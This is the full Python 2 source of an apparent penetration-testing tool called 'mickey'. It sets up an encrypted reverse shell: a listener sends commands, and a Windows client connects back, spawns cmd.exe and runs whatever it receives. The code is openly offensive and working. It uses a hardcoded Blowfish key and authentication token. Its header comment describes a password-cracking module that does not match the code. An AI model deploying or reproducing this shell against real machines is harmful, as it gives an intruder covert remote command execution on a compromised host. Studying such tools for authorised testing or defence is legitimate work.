# Copyright 2011 Stephen Haywood aka AverageSecurityGuy
# www.averagesecurityguy.info
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# crack.py defines a CrackManager object and a CrackThread object, which
# are used to receive and process password cracking requests.
#

import argparse
import subprocess
import blockcipher
import socket
import re
import sys

""" Define some needed classes."""

class InteractiveCommand():
	""" Sets up an interactive session with a process and uses prompt to
	determine when input can be passed into the command."""
	
	def __init__(self, process, prompt):
		self.process = subprocess.Popen( [process], stdin=subprocess.PIPE,
							stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
		
		self.prompt  = prompt
		self.wait_for_prompt()

	def wait_for_prompt(self):
		output = ""
		while not self.prompt.search(output):
			c = self.process.stdout.read(1)
			if c == "":	break
			output += c

		# Now we're at a prompt; return the output
		return output

	def command(self, command):
		self.process.stdin.write(command + "\n")
		return self.wait_for_prompt()


class Authenticate():
	
	def __init__(self, token):
		self.token = token
		self.authenticated = False

	def check_auth(self):
		return self.authenticated
	
	def auth(self, token):
		if self.token == token:
			self.authenticated = True
	
	def deauth(self):
		self.authenticated = False


###############################################################################
#    MAIN PROGRAM                                                             #
###############################################################################
ENC_ALG = 'blowfish'
ENC_KEY = 'ABCDEFGH'
TOKEN = 'ABCDEFGH'

#Use the argparse module to handle command line arguments.
desc = """Create an encrypted reverse shell to a remote machine. Start mickey as
a server with the -l option. Then use the -c option to connect a remote machine
back to your mickey server."""

parser = argparse.ArgumentParser(description=desc)
parser.add_argument('address', help='IP address for listening or connecting.')
parser.add_argument('port', help='Port for listening or connecting.')
group = parser.add_mutually_exclusive_group()
group.add_argument('-l', action='store_true',
				   help='Setup a listening server.')
group.add_argument('-c', action='store_true',
				   help='Connect to a listening server.')

# Setup necessary variables
args = parser.parse_args()
cipher = blockcipher.BlockCipher(ENC_ALG, ENC_KEY)
auth = Authenticate(TOKEN)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Setup a listening server and send commands from the keyboard.
if args.l == True:

	sock.bind((args.address, int(args.port)))
	sock.listen(5)
	client_socket, address = sock.accept()
	print "Recieved connection from: " + str(address)

	while True:
		#Get command from user
		cmd = sys.stdin.readline().strip()
		
		if cmd == 'quit-mickey':
			client_socket.send(cipher.encrypt_str(cmd))
			break

		client_socket.send(cipher.encrypt_str(cmd))
		
		data = client_socket.recv(1024).strip()
		
		if not data == '':
			print cipher.decrypt_str(data)
		
if args.c == True:
	cp = InteractiveCommand("cmd.exe", re.compile(r"^C:\\.*>", re.M))
	sock.connect((args.address, int(args.port)))

	while True:
		data = cipher.decrypt_str(sock.recv(1024).strip())
		print "Received command: " + data
		
		if data == 'quit-mickey': break
		
		if data == 'close-mickey': auth.deauth()
		
		if auth.check_auth():
			res = cp.command(data)
			sock.send(cipher.encrypt_str(res))
		else:
			auth.auth(data)
			sock.send('\n')
